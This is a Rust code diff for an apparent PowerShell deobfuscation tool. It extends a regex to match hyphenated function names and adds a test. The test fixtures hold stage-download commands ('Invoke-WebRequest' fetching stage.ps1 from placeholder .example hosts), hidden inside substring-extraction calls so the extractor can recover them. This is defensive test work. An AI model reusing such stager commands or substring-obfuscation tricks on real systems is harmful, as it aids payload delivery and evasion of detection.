@@ -940,7 +940,8 @@ static PS_LONG_B64_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
 
 #[allow(clippy::expect_used)]
 static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?i)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\b"#).expect("ps function def regex")
+    Regex::new(r#"(?i)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)\b"#)
+        .expect("ps function def regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -6949,6 +6950,28 @@ mod literal_substring_extractor_tests {
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1'"),
             "substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_hyphenated_function_name_substring_extractor_call_is_rewritten() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-hyphen-function-extractor.example/stage.ps1";
+        let text = format!(
+            r#"function Get-Text($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Get-Text 'zz{decoded}yy' 2 {len}"#,
+            len = decoded.len()
+        );
+
+        let out = expand_literal_substring_extractor_calls(&text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-hyphen-function-extractor.example/stage.ps1'"
+            ),
+            "hyphenated-function substring extractor call was not rewritten:\n{out}"
         );
     }
 
